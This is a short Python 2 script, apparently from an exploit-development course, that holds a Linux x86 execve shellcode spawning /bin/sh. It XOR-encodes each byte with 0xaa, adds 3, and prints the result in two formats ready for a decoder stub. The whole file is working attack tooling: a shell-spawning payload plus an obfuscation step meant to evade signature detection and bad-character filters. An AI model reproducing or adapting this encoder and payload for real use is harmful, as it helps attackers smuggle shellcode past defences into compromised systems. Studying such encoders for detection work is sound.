#!/usr/bin/python
# XOR all bytes then increase them by 3
# Python Encoder 
from textwrap import wrap
import random

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")


encoded = ""
encoded2 = ""
encoded3 = ""

print 'Encoded shellcode ...'



for x in bytearray(shellcode) :
	x = x^0xaa
	encoded += '\\x'
	encoded += '%02x' % (x+3) # %02x tells format() to use at least 2 digits in hex

	encoded2 += '0x'
	encoded2 += '%02x,' % (x+3)



print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode))


